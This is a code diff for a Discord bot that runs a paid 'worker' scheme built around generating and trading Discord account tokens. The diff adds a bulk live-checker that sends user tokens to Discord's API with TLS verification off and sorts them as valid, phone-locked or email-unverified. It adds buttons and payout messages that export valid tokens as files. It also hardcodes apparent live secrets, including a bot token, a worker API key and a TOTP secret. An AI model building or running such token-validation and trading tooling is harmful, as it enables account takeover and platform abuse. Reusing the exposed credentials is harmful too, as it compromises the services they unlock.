@@ -29,6 +29,7 @@ import discord
 import random as _random
 from discord import app_commands
 from discord.ext import commands, tasks
+from discord.ui.media_gallery import MediaGalleryItem as _MediaGalleryItem, UnfurledMediaItem as _UnfurledMediaItem
 from datetime import datetime, timezone, timedelta
 from PIL import Image, ImageDraw, ImageFont
 
@@ -36,18 +37,18 @@ from PIL import Image, ImageDraw, ImageFont
 #  FILL IN ALL VALUES BELOW BEFORE RUNNING THE BOT
 # ══════════════════════════════════════════════════════════════════
 
-BOT_TOKEN      = os.environ.get("BOT_TOKEN", "")
-API_BASE_URL   = os.environ.get("CTRL_API_URL", "https://skyhighev.onrender.com")
-WORKER_API_KEY = os.environ.get("WORKER_API_KEY", "")
-TOTP_SECRET    = os.environ.get("TOTP_SECRET", "")
-ADMIN_KEY      = os.environ.get("ADMIN_KEY", "")
-ADMIN_IDS      = { 1499372249503895552, 1482575133779427488 }
+BOT_TOKEN         = "MTUwNzYzMjUxNzAxOTIwOTc3MQ.GGfU21.bHeVOr0gSH_vwy-pUpqqOUQd_4uxRGJPHxZi10"
+API_BASE_URL      = "https://skyhighev.onrender.com"
+WORKER_API_KEY    = "WAK-EA328FEDEDC3AB55DE03B84B90E1F03B7C20BA5E77AF7C5A"
+ADMIN_ACCESS_CODE = "SKY-129"   # ← set to your Admin Access Code (used as x-admin-key header)
+TOTP_SECRET       = "YYUACPGKAASUNKZTEAWMGCDSLSAA"
+ADMIN_IDS         = { 1496870243581165621, 1496870243581165621 }
 WORKER_ROLE_ID = 0  # ← set to your worker role ID (e.g. 1234567890123456789)
 # Channel where payout request notifications are sent (set to your admin/payout channel ID)
-PAYOUT_NOTIFY_CHANNEL_ID = 1491674976787365978   # ← replace 0 with your channel ID
-TICKET_CATEGORY_ID       = 1491820563025363045                     # ← set to your ticket category channel ID (0 = no category)
+PAYOUT_NOTIFY_CHANNEL_ID = 1503009242582351903   # ← replace 0 with your channel ID
+TICKET_CATEGORY_ID       = 1503009374212329633                     # ← set to your ticket category channel ID (0 = no category)
 
-# ══════════════════════════════════════════════════════════════════
+# ═══════════════════════════════════════════""═══════════════════════
 
 API_BASE_URL = API_BASE_URL.rstrip("/")
 
@@ -66,14 +67,14 @@ C_DARK    = 0x1E1B4B
 
 def api_headers(admin: bool = False) -> dict:
     totp = pyotp.TOTP(TOTP_SECRET)
-    h = {
+    headers = {
         "x-api-key":    WORKER_API_KEY,
         "x-totp-code":  totp.now(),
         "Content-Type": "application/json",
     }
-    if admin:
-        h["x-admin-key"] = ADMIN_KEY
-    return h
+    if admin and ADMIN_ACCESS_CODE:
+        headers["x-admin-key"] = ADMIN_ACCESS_CODE
+    return headers
 
 API_TIMEOUT = 60   # seconds — long enough to survive Render cold starts
 API_RETRIES = 2    # total attempts per call
@@ -522,6 +523,7 @@ async def broadcast_dm(interaction: discord.Interaction, subject: str, message: 
 #     -1  → ERROR   (network failure — do NOT change status)
 #
 _GUILDS_URL = "https://discord.com/api/v9/users/@me/guilds"
+_ME_URL     = "https://discord.com/api/v9/users/@me"
 
 _HDRS = {
     "User-Agent": (
@@ -560,21 +562,62 @@ def _get_discord(url: str, token: str, retries: int = 12) -> int:
 
 def _check_token_sync(token: str) -> str:
     """
-    Live token check using GET /users/@me/guilds — the confirmed-working method.
+    Two-step live token check — correctly distinguishes phone-locked vs email-unverified.
 
-      200 → VALID   (token alive, account in good standing)
-      403 → LOCKED  (phone-locked / account restricted)
-      401 → INVALID (token revoked or malformed)
-      -1  → ERROR   (network failure — do NOT change status)
-      *   → ERROR   (unexpected response — do NOT change status)
+    Step 1 — GET /users/@me:
+      401 → INVALID  (token revoked / malformed)
+      403 → PHONE_LOCKED  (rare; account hard-blocked)
+      200 + verified=false → EMAIL_UNVERIFIED
+      200 + verified=true  → proceed to step 2
 
-    Returns: 'VALID', 'LOCKED', 'INVALID', or 'ERROR'
+    Step 2 — GET /users/@me/guilds:
+      200 → VALID
+      403 → PHONE_LOCKED  (phone verification required)
+      401 → INVALID
+      *   → ERROR
+
+    Returns: 'VALID', 'PHONE_LOCKED', 'EMAIL_UNVERIFIED', 'INVALID', or 'ERROR'
     """
+    hdrs = {**_HDRS, "Authorization": token}
+    # ── Step 1: token validity + email verification ──────────────────────────
+    for attempt in range(4):
+        try:
+            resp = requests.get(_ME_URL, headers=hdrs, timeout=20, verify=False)
+            sc = resp.status_code
+            if sc == 429:
+                try:
+                    wait = float(resp.json().get("retry_after", 5.0)) + 1.5
+                except Exception:
+                    wait = 6.0
+                _time.sleep(min(wait, 60.0))
+                continue
+            if sc in (500, 502, 503, 504):
+                _time.sleep(2.0 * (attempt + 1))
+                continue
+            if sc == 401:
+                return "INVALID"
+            if sc == 403:
+                return "PHONE_LOCKED"
+            if sc == 200:
+                try:
+                    user_data = resp.json()
+                    if not user_data.get("verified", True):
+                        return "EMAIL_UNVERIFIED"
+                except Exception:
+                    pass
+                break   # email verified — proceed to guild check
+            return "ERROR"
+        except Exception:
+            _time.sleep(2.0 * (attempt + 1))
+    else:
+        return "ERROR"
+
+    # ── Step 2: phone-lock detection ─────────────────────────────────────────
     status = _get_discord(_GUILDS_URL, token)
     if status == 200:
         return "VALID"
     if status == 403:
-        return "LOCKED"
+        return "PHONE_LOCKED"
     if status == 401:
         return "INVALID"
     return "ERROR"
@@ -614,8 +657,10 @@ async def _discord_live_check(token_entries: list, progress: dict | None = None)
         async with _lock:
             if result == "VALID":
                 valid_list.append((label, token))
-            elif result == "LOCKED":
-                locked_list.append(label)
+            elif result in ("LOCKED", "PHONE_LOCKED"):
+                locked_list.append(f"[PHONE LOCKED] {label}")
+            elif result == "EMAIL_UNVERIFIED":
+                locked_list.append(f"[EMAIL UNVERIFIED] {label}")
             elif result == "INVALID":
                 invalid_list.append(label)
             else:
@@ -745,7 +790,7 @@ async def fetch_tokens(
     if valid_list:
         files.append(discord.File(fp=io.BytesIO("\n".join(valid_list).encode()),   filename="valid_tokens.txt"))
     if locked_list:
-        files.append(discord.File(fp=io.BytesIO("\n".join(locked_list).encode()),  filename="phone_locked.txt"))
+        files.append(discord.File(fp=io.BytesIO("\n".join(locked_list).encode()),  filename="locked.txt"))
     if invalid_list:
         files.append(discord.File(fp=io.BytesIO("\n".join(invalid_list).encode()), filename="invalid_tokens.txt"))
     if files:
@@ -982,7 +1027,7 @@ async def live_check(interaction: discord.Interaction, file: discord.Attachment)
         content = "\n".join(line for line, _ in valid_list)
         files.append(discord.File(fp=io.BytesIO(content.encode()),              filename="valid_tokens.txt"))
     if locked_list:
-        files.append(discord.File(fp=io.BytesIO("\n".join(locked_list).encode()), filename="phone_locked.txt"))
+        files.append(discord.File(fp=io.BytesIO("\n".join(locked_list).encode()), filename="locked.txt"))
     if invalid_list:
         files.append(discord.File(fp=io.BytesIO("\n".join(invalid_list).encode()), filename="invalid_tokens.txt"))
     if error_list:
@@ -1126,7 +1171,7 @@ async def live_check_all(
     if valid_list:
         files.append(discord.File(fp=io.BytesIO("\n".join(lbl for lbl, _ in valid_list).encode()), filename="valid_tokens.txt"))
     if locked_list:
-        files.append(discord.File(fp=io.BytesIO("\n".join(locked_list).encode()),  filename="phone_locked.txt"))
+        files.append(discord.File(fp=io.BytesIO("\n".join(locked_list).encode()),  filename="locked.txt"))
     if invalid_list:
         files.append(discord.File(fp=io.BytesIO("\n".join(invalid_list).encode()), filename="invalid_tokens.txt"))
     if error_list:
@@ -2293,7 +2338,6 @@ async def get_credentials(interaction: discord.Interaction):
         _td(
             f"**API Server URL:**\n```{API_BASE_URL}```\n"
             f"**Worker API Key:**\n```{WORKER_API_KEY}```\n"
-            f"**Admin Key:**\n```{ADMIN_KEY}```\n"
             f"**TOTP Secret:**\n```{TOTP_SECRET}```"
         ),
         _sep(),
@@ -3087,15 +3131,11 @@ async def leaderboard(interaction: discord.Interaction):
             def __init__(self):
                 super().__init__(timeout=None)
                 self.add_item(_cv2_cont(
-                    _td("##   Worker Leaderboard"),
-                    _sep(),
-                    _td(f"Top **{min(len(board), 10)}** workers ranked by all-time tokens generated"),
                     discord.ui.MediaGallery(
-                        discord.ui.MediaGalleryItem(
-                            media=discord.ui.UnfurledMediaItem(url="attachment://leaderboard.png")
+                        _MediaGalleryItem(
+                            media=_UnfurledMediaItem(url="attachment://leaderboard.png")
                         )
                     ),
-                    _td(f"-# {_FOOTER_TEXT}"),
                     color=C_GOLD,
                 ))
 
@@ -3148,15 +3188,11 @@ async def top_today(interaction: discord.Interaction):
             def __init__(self):
                 super().__init__(timeout=None)
                 self.add_item(_cv2_cont(
-                    _td("##   Today's Top Workers"),
-                    _sep(),
-                    _td(f"Top **{min(len(board), 10)}** workers by tokens generated today — resets at midnight UTC"),
                     discord.ui.MediaGallery(
-                        discord.ui.MediaGalleryItem(
-                            media=discord.ui.UnfurledMediaItem(url="attachment://leaderboard.png")
+                        _MediaGalleryItem(
+                            media=_UnfurledMediaItem(url="attachment://leaderboard.png")
                         )
                     ),
-                    _td(f"-# {_FOOTER_TEXT}"),
                     color=C_INFO,
                 ))
 
@@ -3237,6 +3273,61 @@ async def my_rank(interaction: discord.Interaction):
     ), ephemeral=True)
 
 
+# ── Profile LayoutView with action buttons ─────────────────────────────────────
+
+class ProfileLayout(discord.ui.LayoutView):
+    """Profile result view with quick-action buttons."""
+
+    def __init__(self, container: discord.ui.Container, worker_key: str,
+                 valid_lines: list[str], locked_lines: list[str], invalid_lines: list[str]):
+        super().__init__(timeout=600)
+        self.worker_key   = worker_key
+        self.valid_lines  = valid_lines
+        self.locked_lines = locked_lines
+        self.invalid_lines = invalid_lines
+        self.add_item(container)
+
+        key_btn = discord.ui.Button(label="Show My Key", style=discord.ButtonStyle.secondary, emoji="🔑")
+        key_btn.callback = self._show_key
+
+        payout_btn = discord.ui.Button(label="Request Payout", style=discord.ButtonStyle.success, emoji="💰")
+        payout_btn.callback = self._request_payout
+
+        dl_btn = discord.ui.Button(label="Download Valid Tokens", style=discord.ButtonStyle.primary, emoji="📥")
+        dl_btn.callback = self._download_valid
+
+        self.add_item(discord.ui.ActionRow(key_btn, payout_btn, dl_btn))
+
+    async def _show_key(self, interaction: discord.Interaction):
+        await interaction.response.send_message(
+            view=_cv2(C_BRAND,
+                _td("## 🔑 Your Worker Key"),
+                _sep(),
+                _td("Keep this private — do not share it with anyone."),
+                _td(f"**Key:**\n```{self.worker_key}```"),
+                _td("-# Tap the code block to copy  ·  SkyHighEV"),
+            ),
+            ephemeral=True,
+        )
+
+    async def _request_payout(self, interaction: discord.Interaction):
+        await _do_payout_request(interaction)
+
+    async def _download_valid(self, interaction: discord.Interaction):
+        if not self.valid_lines:
+            await interaction.response.send_message(
+                view=cv2_err("No Valid Tokens", "You have no live-valid tokens at this time."),
+                ephemeral=True,
+            )
+            return
+        fp = io.BytesIO("\n".join(self.valid_lines).encode())
+        await interaction.response.send_message(
+            view=cv2_ok("Valid Tokens", f"**{len(self.valid_lines):,}** valid token(s) attached."),
+            file=discord.File(fp=fp, filename="valid_tokens.txt"),
+            ephemeral=True,
+        )
+
+
 # ── /profile ──────────────────────────────────────────────────────────────────
 
 @bot.tree.command(name="profile", description="View your worker profile and live token status")
@@ -3262,8 +3353,15 @@ async def profile(interaction: discord.Interaction):
         status_display += "   Suspended"
 
     # Fetch tokens from DB to get token strings for live validation
-    token_data = await aapi_get("/tokens/fetch", params={"discordId": str(interaction.user.id)}, admin=True)
+    token_data, wlist = await asyncio.gather(
+        aapi_get("/tokens/fetch", params={"discordId": str(interaction.user.id)}, admin=True),
+        aapi_get("/workers/list", admin=True),
+    )
     all_tokens = token_data.get("tokens", []) if "error" not in token_data else []
+
+    # Resolve worker key for the "Show My Key" button
+    wdata      = next((w for w in wlist.get("workers", []) if w.get("discordId") == str(interaction.user.id)), None)
+    worker_key = wdata.get("workerKey", "N/A") if wdata else "N/A"
 
     # Build live-check entries
     entries = []
@@ -3305,6 +3403,7 @@ async def profile(interaction: discord.Interaction):
             lv_total   = lv_valid + lv_locked + lv_invalid
             lv_rate    = round((lv_valid / lv_total) * 100) if lv_total > 0 else 0
         else:
+            valid_e = []; locked_l = []; invalid_l = []
             lv_valid = lv_locked = lv_invalid = lv_total = lv_rate = 0
     finally:
         pf_done.set()
@@ -3326,7 +3425,7 @@ async def profile(interaction: discord.Interaction):
 
     susp_block = f"\n **Suspended:** {susp.get('reason','—')}" if susp else ""
 
-    result_view = _cv2(C_BRAND,
+    profile_container = _cv2_cont(
         _td(f"## Worker Profile  ·  {worker['discordUsername']}"),
         _sep(),
         _td(
@@ -3339,6 +3438,14 @@ async def profile(interaction: discord.Interaction):
             + token_block + susp_block
         ),
         _td("-# Live-validated via Discord API  ·  SkyHighEV  ·  Worker System"),
+        color=C_BRAND,
+    )
+    result_view = ProfileLayout(
+        container     = profile_container,
+        worker_key    = worker_key,
+        valid_lines   = [lbl for lbl, _ in valid_e],
+        locked_lines  = list(locked_l),
+        invalid_lines = list(invalid_l),
     )
 
     try:
@@ -3570,24 +3677,50 @@ class PayoutConfirmLayout(discord.ui.LayoutView):
         if self.notify_channel_id:
             ch = bot.get_channel(self.notify_channel_id)
             if ch:
-                await ch.send(view=_cv2(C_WARN,
-                    _td("##   New Payout Request"),
-                    _sep(),
-                    _td(f"<@{req['discordId']}> has submitted a payout request."),
-                    _sep(),
-                    _td(
-                        f"**Worker:** {req['discordUsername']} (`{req['discordId']}`)\n"
-                        f"**Valid:** `{req['validCount']:,}`\n"
-                        f"**Locked:** `{req.get('lockedCount', 0):,}`\n"
-                        f"**Invalid:** `{req.get('invalidCount', 0):,}`\n"
-                        f"**Amount:** `${req['amountUsd']:.2f}`\n"
-                        f"**Rate:** `${req['pricePerToken']:.4f}`/token\n"
-                        f"**Payout Method:**\n```{req['payoutMethod']}```\n"
-                        f"**Request ID:** `#{req_id}`"
+                # Build the 3 token files to attach
+                payout_files = []
+                valid_lines   = req.get("_validLines",   [])
+                locked_lines  = req.get("_lockedLines",  [])
+                invalid_lines = req.get("_invalidLines", [])
+                if valid_lines:
+                    payout_files.append(discord.File(
+                        fp=io.BytesIO("\n".join(valid_lines).encode()),
+                        filename=f"valid_tokens_{req_id}.txt",
+                    ))
+                if locked_lines:
+                    payout_files.append(discord.File(
+                        fp=io.BytesIO("\n".join(locked_lines).encode()),
+                        filename=f"locked_tokens_{req_id}.txt",
+                    ))
+                if invalid_lines:
+                    payout_files.append(discord.File(
+                        fp=io.BytesIO("\n".join(invalid_lines).encode()),
+                        filename=f"invalid_tokens_{req_id}.txt",
+                    ))
+
+                send_kwargs = dict(
+                    view=_cv2(C_WARN,
+                        _td("##   New Payout Request"),
+                        _sep(),
+                        _td(f"<@{req['discordId']}> has submitted a payout request."),
+                        _sep(),
+                        _td(
+                            f"**Worker:** {req['discordUsername']} (`{req['discordId']}`)\n"
+                            f"**Valid:** `{req['validCount']:,}`\n"
+                            f"**Locked:** `{req.get('lockedCount', 0):,}`\n"
+                            f"**Invalid:** `{req.get('invalidCount', 0):,}`\n"
+                            f"**Amount:** `${req['amountUsd']:.2f}`\n"
+                            f"**Rate:** `${req['pricePerToken']:.4f}`/token\n"
+                            f"**Payout Method:**\n```{req['payoutMethod']}```\n"
+                            f"**Request ID:** `#{req_id}`"
+                        ),
+                        _sep(),
+                        _td(f"-# Use /mark-paid {req_id} to mark as paid  \u00b7  SkyHighEV"),
                     ),
-                    _sep(),
-                    _td(f"-# Use /mark-paid {req_id} to mark as paid  \u00b7  SkyHighEV"),
-                ))
+                )
+                if payout_files:
+                    send_kwargs["files"] = payout_files
+                await ch.send(**send_kwargs)
 
     async def _cancel(self, interaction: discord.Interaction):
         if self.done:
@@ -3720,6 +3853,9 @@ async def _do_payout_request(interaction: discord.Interaction):
         "createdAt":       created,
         "paidAt":          None,
         "tokens":          valid_token_strs,
+        "_validLines":     [lbl for lbl, _ in valid_list],
+        "_lockedLines":    list(locked_list),
+        "_invalidLines":   list(invalid_list),
     }
 
     confirm_layout = PayoutConfirmLayout(req_data, PAYOUT_NOTIFY_CHANNEL_ID, interaction.user.display_avatar.url)
@@ -7986,8 +8122,8 @@ if __name__ == "__main__":
     if not BOT_TOKEN:
         print("[ERROR] BOT_TOKEN is empty")
         raise SystemExit(1)
-    if not API_BASE_URL or not WORKER_API_KEY or not TOTP_SECRET or not ADMIN_KEY:
-        print("[ERROR] API credentials missing")
+    if not API_BASE_URL or not WORKER_API_KEY or not TOTP_SECRET:
+        print("[ERROR] API credentials missing (need API_BASE_URL, WORKER_API_KEY, TOTP_SECRET)")
         raise SystemExit(1)
     if not ADMIN_IDS:
         print("[WARN] ADMIN_IDS is empty — admin commands inaccessible")
